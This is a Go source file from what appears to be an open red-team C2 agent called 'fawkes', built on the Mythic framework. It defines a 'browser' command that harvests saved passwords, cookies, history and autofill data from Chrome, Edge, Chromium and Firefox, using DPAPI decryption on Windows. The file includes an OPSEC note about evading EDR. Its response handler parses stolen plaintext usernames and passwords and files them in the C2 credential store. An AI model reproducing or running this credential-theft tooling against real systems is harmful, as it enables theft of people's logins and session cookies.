package agentfunctions

import (
	"fmt"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "browser",
		Description:         "Harvest browser data from Chromium-based browsers (Chrome, Edge, Chromium) and Firefox. Windows supports all actions including credential/cookie decryption via DPAPI. macOS/Linux support history, autofill, bookmarks, downloads, and Firefox cookies. (T1555.003, T1217)",
		HelpString:          "browser [-action <passwords|cookies|history|autofill|bookmarks|downloads>] [-browser <all|chrome|edge|chromium|firefox>]",
		Version:             5,
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1555.003", "T1217"},
		ScriptOnlyCommand:   false,
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_WINDOWS,
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
			},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				ModalDisplayName: "Action",
				CLIName:          "action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"passwords", "cookies", "history", "autofill", "bookmarks", "downloads"},
				Description:      "What to harvest: passwords (Windows Chromium only — DPAPI), cookies (Windows Chromium DPAPI; Firefox plaintext on all platforms), history (browsing URLs), autofill (form data), bookmarks (saved URLs), or downloads (download history).",
				DefaultValue:     "history",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "browser",
				ModalDisplayName: "Browser",
				CLIName:          "browser",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"all", "chrome", "edge", "chromium", "firefox"},
				Description:      "Which browser to target. 'all' checks Chrome, Edge, Chromium, and Firefox. 'firefox' targets Firefox (places.sqlite for history/bookmarks, formhistory.sqlite for autofill, cookies.sqlite for cookies).",
				DefaultValue:     "all",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
		},
		AssociatedBrowserScript: nil,
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
				action, _ := taskData.Args.GetStringArg("action")
				browser, _ := taskData.Args.GetStringArg("browser")
				msg := fmt.Sprintf("OPSEC WARNING: Browser credential extraction (%s", action)
				if browser != "" {
					msg += fmt.Sprintf(", target: %s", browser)
				}
				msg += "). Accesses browser profile databases (Login Data, Cookies, History). On Windows, uses DPAPI decryption which may trigger CryptUnprotectData monitoring. EDR may flag SQLite database access in browser profile directories."
				return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
					TaskID:             taskData.Task.ID,
					Success:            true,
					OpsecPreBlocked:    false,
					OpsecPreMessage:    msg,
					OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
				}
			},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			browser, _ := taskData.Args.GetStringArg("browser")
			if browser == "" {
				browser = "all"
			}
			action, _ := taskData.Args.GetStringArg("action")
			if action == "" {
				action = "history"
			}
			display := fmt.Sprintf("%s %s", action, browser)
			response.DisplayParams = &display
			createArtifact(taskData.Task.ID, "File Read", fmt.Sprintf("Browser %s database access — %s", action, browser))
			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			// Only parse credential output (passwords action)
			if !strings.Contains(responseText, "Browser Credentials") {
				return response
			}
			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
			// Parse blocks: Browser: ...\nURL: ...\nUsername: ...\nPassword: ...
			lines := strings.Split(responseText, "\n")
			var url, username, password, browser string
			for _, line := range lines {
				trimmed := strings.TrimSpace(line)
				if strings.HasPrefix(trimmed, "Browser:") {
					// Start of new credential block — flush previous
					if username != "" && password != "" {
						creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
							CredentialType: "plaintext",
							Realm:          url,
							Account:        username,
							Credential:     password,
							Comment:        fmt.Sprintf("browser passwords (%s)", browser),
						})
					}
					browser = strings.TrimSpace(strings.TrimPrefix(trimmed, "Browser:"))
					url, username, password = "", "", ""
				} else if strings.HasPrefix(trimmed, "URL:") {
					url = strings.TrimSpace(strings.TrimPrefix(trimmed, "URL:"))
				} else if strings.HasPrefix(trimmed, "Username:") {
					username = strings.TrimSpace(strings.TrimPrefix(trimmed, "Username:"))
				} else if strings.HasPrefix(trimmed, "Password:") {
					password = strings.TrimSpace(strings.TrimPrefix(trimmed, "Password:"))
				}
			}
			// Flush final block
			if username != "" && password != "" {
				creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
					CredentialType: "plaintext",
					Realm:          url,
					Account:        username,
					Credential:     password,
					Comment:        fmt.Sprintf("browser passwords (%s)", browser),
				})
			}
			registerCredentials(processResponse.TaskData.Task.ID, creds)
			return response
		},
	})
}
